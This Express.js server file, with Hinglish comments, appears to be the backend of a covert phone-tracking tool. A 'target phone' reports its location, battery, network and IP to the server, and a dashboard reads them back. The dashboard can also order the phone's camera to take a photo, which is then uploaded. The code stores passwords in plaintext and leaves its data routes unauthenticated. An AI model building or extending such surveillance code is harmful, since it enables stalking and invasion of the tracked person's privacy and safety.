const express = require('express');
const cors = require('cors');
const path = require('path');
const mongoose = require('mongoose');
require('dotenv').config();

const Location = require('./models/Location');
const User = require('./models/User');

const app = express();
const PORT = process.env.PORT || 10000;

app.use(cors());
app.use(express.json({ limit: '10mb' })); // Camera photo ke liye limit badhayi
app.use(express.static(path.join(__dirname, 'public')));

// 1. DATABASE CONNECTION
const mongoURI = process.env.MONGO_URI; 
mongoose.connect(mongoURI)
    .then(() => console.log("[+] DATABASE CONNECTED SUCCESSFULLY!"))
    .catch(err => console.log("[-] DATABASE CONNECTION FAILED:", err));

// 2. USER REGISTRATION
app.post('/api/register', async (req, res) => {
    try {
        const { username, password, deviceId } = req.body;
        const existingUser = await User.findOne({ username });
        if (existingUser) return res.status(400).json({ success: false, message: "Username already exists!" });
        
        const newUser = new User({ username, password, deviceId });
        await newUser.save();
        res.json({ success: true, message: "Account created successfully!" });
    } catch (error) { res.status(500).json({ success: false, message: "Server Error" }); }
});

// 3. USER LOGIN
app.post('/api/login', async (req, res) => {
    try {
        const { username, password } = req.body;
        const user = await User.findOne({ username, password });
        if (user) res.json({ success: true, deviceId: user.deviceId });
        else res.status(401).json({ success: false, message: "Invalid Credentials!" });
    } catch (error) { res.status(500).json({ success: false, message: "Server Error" }); }
});

// 4. RECEIVE LOCATION FROM TARGET PHONE
app.post('/api/update-location', async (req, res) => {
    try {
        // YAHAN BATTERY AUR NETWORK RECEIVE HOGA
        const { deviceId, lat, lng, accuracy, battery, network, ipAddress } = req.body;
        const newLocation = new Location({ 
            deviceId, latitude: lat, longitude: lng, accuracy, battery, network, ipAddress 
        });
        await newLocation.save();
        res.json({ success: true, message: "Location securely updated." });
    } catch (error) { res.status(500).json({ success: false, message: "Database Error!" }); }
});

// 5. SEND LOCATION TO DASHBOARD
app.post('/api/get-location', async (req, res) => {
    try {
        const { deviceId } = req.body;
        const latestLocation = await Location.findOne({ deviceId }).sort({ timestamp: -1 });
        if (latestLocation) {
            res.json({
                lat: parseFloat(latestLocation.latitude),
                lng: parseFloat(latestLocation.longitude),
                accuracy: parseFloat(latestLocation.accuracy),
                battery: latestLocation.battery || "Unknown",
                network: latestLocation.network || "Unknown",
                ipAddress: latestLocation.ipAddress || "Unknown",
                photoUrl: latestLocation.photoUrl || "",
                status: "LIVE TRACKING ACTIVE"
            });
        } else { res.json({ status: "TARGET OFFLINE / NO DATA" }); }
    } catch (error) { res.status(500).json({ status: "ERROR FETCHING DATA" }); }
});

// 6. COMMAND SYSTEM (Photo lene ke liye)
app.post('/api/send-command', async (req, res) => {
    try {
        await User.findOneAndUpdate({ deviceId: req.body.deviceId }, { actionCommand: req.body.command });
        res.json({ success: true });
    } catch (err) { res.status(500).json({ success: false }); }
});

app.post('/api/check-command', async (req, res) => {
    try {
        const user = await User.findOne({ deviceId: req.body.deviceId });
        res.json({ command: user ? user.actionCommand : "NONE" });
    } catch (err) { res.status(500).json({ command: "NONE" }); }
});

app.post('/api/upload-photo', async (req, res) => {
    try {
        const { deviceId, photoUrl } = req.body;
        const latest = await Location.findOne({ deviceId }).sort({ timestamp: -1 });
        if (latest) {
            latest.photoUrl = photoUrl;
            await latest.save();
        }
        await User.findOneAndUpdate({ deviceId }, { actionCommand: "NONE" });
        res.json({ success: true });
    } catch (err) { res.status(500).json({ success: false }); }
});

// 7. CATCH-ALL ROUTE (Crash-proof)
app.use((req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// 8. START SERVER
app.listen(PORT, () => {
    console.log(`[+] SYSTEM ONLINE ON PORT ${PORT}`);
});
